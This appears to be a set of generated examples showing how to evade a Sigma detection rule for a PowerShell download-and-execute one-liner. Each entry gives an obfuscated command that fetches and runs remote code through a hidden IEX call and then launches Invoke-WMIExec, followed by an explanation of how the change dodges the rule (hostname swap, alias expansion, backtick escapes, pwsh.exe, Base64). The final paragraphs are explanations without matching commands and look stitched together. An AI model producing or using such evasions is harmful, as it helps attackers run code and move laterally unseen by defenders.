output: powershell -nop -noni -ep bypass -w h -c "$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"
explanation: This command bypasses the rule by substituting the explicit IP address '[http://127.0.0.1](http://127.0.0.1)' with 'http://localhost'. Since the Sigma rule relies on a 'contains|all' condition that specifically requires the exact string '[http://127.0.0.1](http://127.0.0.1)', changing the hostname representation successfully evades detection while keeping the functionality intact.

output: powershell -nop -noni -ep bypass -w h -c "$u=('[http://127.0.0.1:1337/](http://127.0.0.1:1337/)' | ForEach-Object { Invoke-RestMethod $* });&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\I`nvoke-WMIExec.ps1; I`nvoke-WMIExec"
explanation: This command evades the rule by breaking two of the required string matches. First, it replaces the shorthand alias '%{(IRM $*)}' with its fully expanded cmdlet form 'ForEach-Object { Invoke-RestMethod $* }'. Second, it uses a PowerShell escape character (backtick) in the word 'I`nvoke' to prevent the exact string match for 'Invoke'.

output: pwsh.exe -nop -noni -ep bypass -w h -c "$u=('[http://127.0.0.1:1337/](http://127.0.0.1:1337/)'|%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"
explanation: This command bypasses the rule by executing via PowerShell Core ('pwsh.exe') instead of Windows PowerShell ('powershell.exe'). The Sigma rule specifically targets 'Image|endswith: \powershell.exe', making it blind to equivalent commands executed through the modern pwsh binary.

The original rule triggers on three specific strings occurring simultaneously: the literal IP '127.0.0.1', the specific alias shorthand '%{(IRM $_)}', and the string 'Invoke'. This bypass breaks the IP string into variables, uses the full 'ForEach-Object' name instead of the '%' alias, and uses 'Invoke-RestMethod' instead of the 'IRM' alias, satisfying the functional requirements of the one-liner while avoiding the exact string matches.

The rule targets 'process_creation' logs which often capture the command line. By using Base64 encoding (-EncodedCommand or -e), the literal strings '127.0.0.1', '%{(IRM $_)}', and 'Invoke' are not visible in the plaintext command line, effectively bypassing string-based detection filters that do not perform automatic decoding.
